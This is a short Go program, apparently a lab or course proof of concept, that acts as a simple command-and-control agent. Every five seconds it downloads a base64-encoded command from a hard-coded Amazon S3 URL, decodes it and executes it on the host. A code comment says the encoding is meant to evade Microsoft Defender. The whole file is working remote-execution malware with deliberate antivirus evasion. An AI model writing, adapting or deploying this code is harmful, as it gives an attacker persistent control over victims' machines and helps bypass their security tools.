package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"time"
)

func main() {
	url := "https://2ic80.s3.eu-central-1.amazonaws.com/calc.txt" // replace with your desired URL

	// Fetch the commands to run every 5 seconds
	ticker := time.NewTicker(5 * time.Second)

	for range ticker.C {
		resp, err := http.Get(url)
		if err != nil {
			fmt.Println("Error fetching URL:", err)
			continue
		}

		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
			continue
		}

		// Do some _extremly_ basic obfuscation to prevent MS defender screaming
		decoded, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			fmt.Println("Error decoding base64:", err)
			continue
		}

		cmd := exec.Command(string(decoded))
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		err = cmd.Run()
		if err != nil {
			fmt.Println("Error executing command:", err)
			continue
		}
	}
}
